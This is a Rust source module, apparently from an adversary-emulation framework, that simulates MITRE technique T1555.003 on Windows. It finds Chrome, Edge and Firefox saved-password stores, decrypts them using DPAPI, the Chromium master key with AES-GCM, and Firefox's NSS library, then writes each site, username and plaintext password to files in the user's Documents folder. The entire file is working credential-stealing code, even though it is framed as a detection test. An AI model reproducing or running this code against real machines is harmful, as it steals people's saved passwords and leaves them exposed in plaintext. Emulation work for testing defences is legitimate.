//! Extracts saved browser passwords for Chrome/Edge/Firefox (T1555.003) on Windows and writes
//! telemetry + action records to the same Magnet telemetry path in Documents.

use crate::core::config::Config;
use crate::core::simulation::Simulation;
use crate::core::telemetry::{ActionRecord, write_action_record};
use crate::core::logger;
use anyhow::{Context, Result};
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, KeyInit};
use base64::engine::general_purpose;
use base64::Engine;
use chrono::Utc;
use libloading::{Library, Symbol};
use rusqlite::Connection;
use serde::Serialize;
use serde_json::Value as JsonValue;
use std::ffi::CString;
use std::fs;
use std::path::{Path, PathBuf};
use std::ptr;
use std::io::Write;
use std::time::Instant;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::winbase::LocalFree;
use winapi::um::wincrypt::DATA_BLOB;

#[derive(Default)]
pub struct BrowserPwdSimulation;

#[derive(Serialize)]
struct BrowserTelemetry {
    test_id: String,
    timestamp: String,
    artifact_paths: Vec<String>,
    chrome_found: bool,
    edge_found: bool,
    firefox_profiles_scanned: usize,
    firefox_decrypted: usize,
    errors: Vec<String>,
    elapsed_ms: u128,
    parent: String,
}

impl BrowserPwdSimulation {
    fn telemetry_dir() -> Option<PathBuf> {
        dirs::home_dir().map(|mut p| {
            p.push("Documents");
            p.push("MagnetTelemetry");
            p
        })
    }

    fn write_detailed_telemetry(cfg: &Config, rec: &BrowserTelemetry) -> Result<()> {
        let dir = Self::telemetry_dir().ok_or_else(|| anyhow::anyhow!("could not determine telemetry output path"))?;
        fs::create_dir_all(&dir).with_context(|| format!("creating telemetry directory {}", dir.display()))?;

        // jsonl
        let mut jsonl = dir.clone();
        jsonl.push(format!("browser_pwd_{}.jsonl", cfg.test_id));
        let mut jf = fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&jsonl)
            .with_context(|| format!("opening telemetry file {}", jsonl.display()))?;
        let j = serde_json::to_string(rec)?;
        writeln!(jf, "{}", j)?;

        // human-readable log
        let mut log = dir;
        log.push(format!("browser_pwd_{}.log", cfg.test_id));
        let mut lf = fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log)
            .with_context(|| format!("opening human log {}", log.display()))?;

        writeln!(lf, "================================================================")?;
        writeln!(lf, "TEST ID   : {}", rec.test_id)?;
        writeln!(lf, "TIMESTAMP : {}", rec.timestamp)?;
        writeln!(lf, "ARTIFACTS : {}", rec.artifact_paths.join(", "))?;
        writeln!(lf, "CHROME    : {}", rec.chrome_found)?;
        writeln!(lf, "EDGE      : {}", rec.edge_found)?;
        writeln!(lf, "FIREFOX   : scanned={}, decrypted={}", rec.firefox_profiles_scanned, rec.firefox_decrypted)?;
        if !rec.errors.is_empty() {
            writeln!(lf, "ERRORS:")?;
            for e in &rec.errors {
                writeln!(lf, "- {}", e)?;
            }
        }
        writeln!(lf, "PARENT    : {}", rec.parent)?;
        writeln!(lf, "ELAPSED_MS: {}", rec.elapsed_ms)?;
        writeln!(lf)?;

        Ok(())
    }

    fn find_local_state_for(login_db: &Path) -> Option<PathBuf> {
        let mut cur = login_db.to_path_buf();
        for _ in 0..5 {
            if let Some(parent) = cur.parent() {
                let candidate = parent.join("Local State");
                if candidate.exists() {
                    return Some(candidate);
                }
                cur = parent.to_path_buf();
            } else {
                break;
            }
        }
        None
    }

    /// Decrypt bytes with Windows DPAPI and return raw vector (binary).
    fn decrypt_dpapi_to_vec(encrypted: &[u8]) -> Result<Option<Vec<u8>>> {
        unsafe {
            let mut in_blob = DATA_BLOB {
                cbData: encrypted.len() as u32,
                pbData: encrypted.as_ptr() as *mut u8,
            };
            let mut out_blob = DATA_BLOB {
                cbData: 0,
                pbData: ptr::null_mut(),
            };
            let res = CryptUnprotectData(
                &mut in_blob,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                0,
                &mut out_blob,
            );
            if res == 0 {
                return Ok(None);
            }
            if out_blob.cbData == 0 || out_blob.pbData.is_null() {
                return Ok(None);
            }
            let slice = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize);
            let v = slice.to_vec();
            LocalFree(out_blob.pbData as _);
            Ok(Some(v))
        }
    }

    fn decrypt_dpapi_to_string(encrypted: &[u8]) -> Result<Option<String>> {
        match Self::decrypt_dpapi_to_vec(encrypted)? {
            Some(v) => Ok(Some(String::from_utf8_lossy(&v).to_string())),
            None => Ok(None),
        }
    }

    /// Extract master key from Local State
    fn get_master_key_from_local_state(local_state_path: &Path) -> Result<Option<Vec<u8>>> {
        if !local_state_path.exists() {
            return Ok(None);
        }
        let ls = fs::read_to_string(local_state_path)?;
        let json: JsonValue = serde_json::from_str(&ls)?;
        let enc_key_b64 = match json
            .get("os_crypt")
            .and_then(|v| v.get("encrypted_key"))
            .and_then(|v| v.as_str())
        {
            Some(s) => s,
            None => return Ok(None),
        };

        let mut enc_key = general_purpose::STANDARD.decode(enc_key_b64)?;
        const DPAPI_PREFIX: &[u8] = b"DPAPI";
        if enc_key.starts_with(DPAPI_PREFIX) {
            enc_key = enc_key[DPAPI_PREFIX.len()..].to_vec();
        }

        match Self::decrypt_dpapi_to_vec(&enc_key)? {
            Some(k) => Ok(Some(k)),
            None => Ok(None),
        }
    }

    /// Decrypt a Chrome/Edge blob using master key (if present) or DPAPI fallback
    fn decrypt_chrome_blob(encrypted: &[u8], master_key_opt: Option<&[u8]>) -> Result<Option<String>> {
        if encrypted.len() >= 3 && (&encrypted[0..3] == b"v10" || &encrypted[0..3] == b"v11") {
            let mk = match master_key_opt {
                Some(mk) => mk,
                None => {
                    // No master key available
                    return Ok(None);
                }
            };
            if mk.len() != 32 {
                return Err(anyhow::anyhow!("master key length is not 32 bytes (got {})", mk.len()));
            }
            if encrypted.len() < 15 {
                return Ok(None);
            }
            let nonce = &encrypted[3..15];
            let ciphertext_and_tag = &encrypted[15..];

            #[allow(deprecated)]
            let key = aes_gcm::Key::<Aes256Gcm>::from_slice(mk);
            #[allow(deprecated)]
            let nonce_arr = aes_gcm::Nonce::from_slice(nonce);
            let cipher = Aes256Gcm::new(key);

            match cipher.decrypt(nonce_arr, ciphertext_and_tag) {
                Ok(plain_bytes) => Ok(Some(String::from_utf8_lossy(&plain_bytes).to_string())),
                Err(e) => Err(anyhow::anyhow!("AES-GCM decrypt failed: {:?}", e)),
            }
        } else {
            match Self::decrypt_dpapi_to_string(encrypted)? {
                Some(s) => Ok(Some(s)),
                None => Ok(None),
            }
        }
    }

    /// Copy DB to temp file and query logins table (Chrome/Edge)
    fn extract_chrome_like(login_db: &Path, errors: &mut Vec<String>) -> Result<Vec<(String, String, Option<String>)>> {
        // returns vec of (origin_url, username, password_or_none)
        let mut out = Vec::new();

        let tmp = std::env::temp_dir().join(format!("LoginData_copy_{}.db", chrono::Utc::now().timestamp()));
        match fs::copy(login_db, &tmp) {
            Ok(_) => {}
            Err(e) => {
                errors.push(format!("Failed to copy {}: {}", login_db.display(), e));
                return Ok(out);
            }
        }
        let conn = Connection::open(&tmp)?;
        let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
        let mut rows = stmt.query([])?;

        let local_state = Self::find_local_state_for(login_db);
        let master_key = if let Some(ls) = local_state.as_ref() {
            match Self::get_master_key_from_local_state(ls) {
                Ok(Some(k)) => Some(k),
                Ok(None) => None,
                Err(e) => {
                    errors.push(format!("Error deriving master key from {}: {:?}", ls.display(), e));
                    None
                }
            }
        } else {
            None
        };

        while let Some(row) = rows.next()? {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let encrypted: Vec<u8> = row.get(2)?;
            match Self::decrypt_chrome_blob(&encrypted, master_key.as_deref()) {
                Ok(maybe_pwd) => out.push((url, username, maybe_pwd)),
                Err(e) => {
                    errors.push(format!("Decrypt failure for {}: {:?}", url, e));
                    out.push((url, username, None));
                }
            }
        }

        let _ = fs::remove_file(&tmp);
        Ok(out)
    }

    /// Firefox via NSS
    fn firefox_try_nss_decrypt(profile_path: &Path, logins_json: &Path, errors: &mut Vec<String>) -> Result<Vec<(String, String, String)>> {
        // returns vec of (hostname, username, password)
        let mut results = Vec::new();

        let data: serde_json::Value = serde_json::from_str(&fs::read_to_string(logins_json)?)?;
        let logins = data
            .get("logins")
            .and_then(|v| v.as_array())
            .ok_or_else(|| anyhow::anyhow!("no logins array"))?;

        let program_files = std::env::var("PROGRAMFILES").unwrap_or_else(|_| "C:\\Program Files".to_string());
        let candidates = vec![
            Path::new(&program_files).join("Mozilla Firefox").join("nss3.dll"),
            profile_path.join("nss3.dll"),
        ];

        let dll_path = candidates
            .into_iter()
            .find(|p| p.exists())
            .ok_or_else(|| anyhow::anyhow!("nss3.dll not found in expected locations. Please install Firefox or provide nss3.dll path"))?;
        // Ensure loader can find dependencies
        if let Some(dll_dir) = dll_path.parent() {
            let dll_dir_str = dll_dir.to_string_lossy().to_string();
            let old_path = std::env::var_os("PATH").unwrap_or_default();
            let mut new_path = dll_dir_str;
            new_path.push(';');
            new_path.push_str(&old_path.to_string_lossy());
            unsafe {
                std::env::set_var("PATH", new_path);
            }
        }

        let lib = unsafe { Library::new(&dll_path)? };

        // SECItem struct(s) & PK11SDR_Decrypt binding
        #[repr(C)]
        struct SECItem {
            r#type: u32,
            data: *mut u8,
            len: u32,
        }

        unsafe {
            let nss_init: Symbol<unsafe extern "C" fn(*const i8) -> i32> = lib.get(b"NSS_Init\0")?;
            let nss_shutdown: Symbol<unsafe extern "C" fn() -> i32> = lib.get(b"NSS_Shutdown\0")?;
            let pk11sdr_decrypt: Symbol<unsafe extern "C" fn(*const SECItem, *mut SECItem, *mut std::ffi::c_void) -> i32> =
                lib.get(b"PK11SDR_Decrypt\0")?;

            let profile_c = CString::new(profile_path.to_string_lossy().as_bytes())?;
            let init_res = nss_init(profile_c.as_ptr());
            if init_res != 0 {
                logger::warn(&format!("NSS_Init returned non-zero: {} (may still work on some builds)", init_res));
            }

            for item in logins {
                if let (Some(enc_u), Some(enc_p), Some(host)) =
                    (item.get("encryptedUsername"), item.get("encryptedPassword"), item.get("hostname"))
                {
                    let enc_u_s = enc_u.as_str().unwrap_or("");
                    let enc_p_s = enc_p.as_str().unwrap_or("");
                    let host_s = host.as_str().unwrap_or("");

                    // b64 decode and call PK11SDR_Decrypt
                    let decrypt_b64 = |b64: &str| -> Result<String> {
                        let decoded = general_purpose::STANDARD.decode(b64)?;
                        let in_item = SECItem {
                            r#type: 0,
                            data: decoded.as_ptr() as *mut u8,
                            len: decoded.len() as u32,
                        };
                        let mut out_item = SECItem {
                            r#type: 0,
                            data: ptr::null_mut(),
                            len: 0,
                        };
                        let res = pk11sdr_decrypt(&in_item as *const SECItem, &mut out_item as *mut SECItem, ptr::null_mut());
                        if res != 0 {
                            return Err(anyhow::anyhow!("PK11SDR_Decrypt returned non-zero: {}", res));
                        }
                        if out_item.data.is_null() || out_item.len == 0 {
                            return Err(anyhow::anyhow!("PK11SDR_Decrypt produced empty output"));
                        }
                        let slice = std::slice::from_raw_parts(out_item.data, out_item.len as usize);
                        let s = String::from_utf8_lossy(slice).to_string();
                        Ok(s)
                    };

                    match (decrypt_b64(enc_u_s), decrypt_b64(enc_p_s)) {
                        (Ok(user), Ok(pass)) => {
                            results.push((host_s.to_string(), user, pass));
                        }
                        (u_err, p_err) => {
                            errors.push(format!("Firefox decrypt failed for {}: user: {:?}, pass: {:?}", host_s, u_err, p_err));
                        }
                    }
                }
            }

            let _ = nss_shutdown();
        }

        Ok(results)
    }

}

impl Simulation for BrowserPwdSimulation {
    fn name(&self) -> &'static str {
        "windows::browser_pwd"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        let start = Instant::now();
        logger::action_running("Extracting browser saved passwords (Chrome, Edge, Firefox)");

        // Dry-run support: only record that we'd run
        if cfg.dry_run {
            logger::info("dry-run: would attempt to extract browser saved passwords");
            let rec = ActionRecord {
                test_id: cfg.test_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                action: format!("T1555.003 - {}", self.name()),
                status: "dry-run".into(),
                details: "dry-run: no extraction performed".into(),
                artifact_path: None,
            };
            let _ = write_action_record(cfg, &rec);
            logger::action_ok();
            return Ok(());
        }

        let mut errors: Vec<String> = Vec::new();
        let mut artifact_paths: Vec<String> = Vec::new();
        let mut firefox_profiles_scanned = 0usize;
        let mut firefox_decrypted = 0usize;
        let mut chrome_found = false;
        let mut edge_found = false;

        let local_appdata = match std::env::var("LOCALAPPDATA") {
            Ok(s) => s,
            Err(e) => {
                let msg = format!("LOCALAPPDATA not found: {}", e);
                logger::action_fail(&msg);
                let rec = ActionRecord {
                    test_id: cfg.test_id.clone(),
                    timestamp: Utc::now().to_rfc3339(),
                    action: format!("T1555.003 - {}", self.name()),
                    status: "failed".into(),
                    details: msg.clone(),
                    artifact_path: None,
                };
                let _ = write_action_record(cfg, &rec);
                return Err(anyhow::anyhow!(msg));
            }
        };

        let appdata = std::env::var("APPDATA").unwrap_or_else(|_| "".to_string());

        // Chrome
        let chrome_login = Path::new(&local_appdata)
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default")
            .join("Login Data");

        if chrome_login.exists() {
            chrome_found = true;
            logger::info(&format!("\nChrome Login Data found at {}", chrome_login.display()));
            match Self::extract_chrome_like(&chrome_login, &mut errors) {
                Ok(entries) => {
                    // For telemetry purposes write a small human-readable artifact file in telemetry dir
                    if let Some(mut telemdir) = Self::telemetry_dir() {
                        fs::create_dir_all(&telemdir).ok();
                        telemdir.push(format!("browser_chrome_{}.txt", cfg.test_id));
                        if let Ok(mut f) = fs::OpenOptions::new().create(true).write(true).truncate(true).open(&telemdir) {
                            for (url, user, pass_opt) in &entries {
                                let _ = writeln!(f, "Site: {}\nUser: {}\nPass: {}\n", url, user, pass_opt.as_deref().unwrap_or("<decrypt failed>"));
                            }
                            artifact_paths.push(telemdir.display().to_string());
                        }
                    }
                }
                Err(e) => errors.push(format!("Chrome extraction failed: {:?}", e)),
            }
        } else {
            logger::info(&format!("Chrome Login Data not found at: {}", chrome_login.display()));
        }

        // Edge
        let edge_login = Path::new(&local_appdata)
            .join("Microsoft")
            .join("Edge")
            .join("User Data")
            .join("Default")
            .join("Login Data");

        if edge_login.exists() {
            edge_found = true;
            logger::info(&format!("Edge Login Data found at {}", edge_login.display()));
            match Self::extract_chrome_like(&edge_login, &mut errors) {
                Ok(entries) => {
                    if let Some(mut telemdir) = Self::telemetry_dir() {
                        fs::create_dir_all(&telemdir).ok();
                        telemdir.push(format!("browser_edge_{}.txt", cfg.test_id));
                        if let Ok(mut f) = fs::OpenOptions::new().create(true).write(true).truncate(true).open(&telemdir) {
                            for (url, user, pass_opt) in &entries {
                                let _ = writeln!(f, "Site: {}\nUser: {}\nPass: {}\n", url, user, pass_opt.as_deref().unwrap_or("<decrypt failed>"));
                            }
                            artifact_paths.push(telemdir.display().to_string());
                        }
                    }
                }
                Err(e) => errors.push(format!("Edge extraction failed: {:?}", e)),
            }
        } else {
            logger::info(&format!("Edge Login Data not found at: {}", edge_login.display()));
        }

        // Firefox
        logger::info("Scanning Firefox profiles...");
        let ff_profiles = Path::new(&appdata).join("Mozilla").join("Firefox").join("Profiles");
        let mut firefox_profile_paths: Vec<PathBuf> = Vec::new();

        if ff_profiles.exists() {
            for entry in fs::read_dir(&ff_profiles)? {
                let entry = entry?;
                if entry.file_type()?.is_dir() {
                    let profile_path = entry.path();
                    let logins = profile_path.join("logins.json");
                    let key4 = profile_path.join("key4.db");
                    if logins.exists() && key4.exists() {
                        firefox_profiles_scanned += 1;
                        firefox_profile_paths.push(profile_path.clone());
                        logger::info(&format!("Found Firefox profile: {}", profile_path.display()));
                        match Self::firefox_try_nss_decrypt(&profile_path, &logins, &mut errors) {
                            Ok(entries) => {
                                firefox_decrypted += entries.len();
                                if let Some(mut telemdir) = Self::telemetry_dir() {
                                    fs::create_dir_all(&telemdir).ok();
                                    telemdir.push(format!("browser_firefox_{}.txt", cfg.test_id));
                                    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(&telemdir) {
                                        for (host, user, pass) in entries {
                                            let _ = writeln!(f, "Site: {}\nUser: {}\nPass: {}\n", host, user, pass);
                                        }
                                        artifact_paths.push(telemdir.display().to_string());
                                    }
                                }
                            }
                            Err(e) => errors.push(format!("Firefox NSS attempt failed for {}: {:?}", profile_path.display(), e)),
                        }
                    }
                }
            }
        } else {
            logger::info(&format!("Firefox profiles folder not found at: {}", ff_profiles.display()));
        }

        // Compose telemetry record
        let elapsed = start.elapsed();
        let parent = std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "<unknown>".to_string());

        let btele = BrowserTelemetry {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            artifact_paths: artifact_paths.clone(),
            chrome_found,
            edge_found,
            firefox_profiles_scanned,
            firefox_decrypted,
            errors: errors.clone(),
            elapsed_ms: elapsed.as_millis(),
            parent,
        };

        if let Err(e) = Self::write_detailed_telemetry(cfg, &btele) {
            logger::warn(&format!("failed to write browser telemetry: {}", e));
        }

        // Action record
        let rec = ActionRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            action: format!("T1555.003 - {}", self.name()),
            status: "written".into(),
            details: format!("chrome_found={} edge_found={} firefox_profiles_scanned={}", chrome_found, edge_found, firefox_profiles_scanned),
            artifact_path: artifact_paths.get(0).cloned(),
        };

        if let Err(e) = write_action_record(cfg, &rec) {
            logger::warn(&format!("failed to write action record: {}", e));
        }

        if !errors.is_empty() {
            logger::warn(&format!("Completed with {} errors; see telemetry for details", errors.len()));
        } else {
            logger::action_ok();
        }

        Ok(())
    }
}
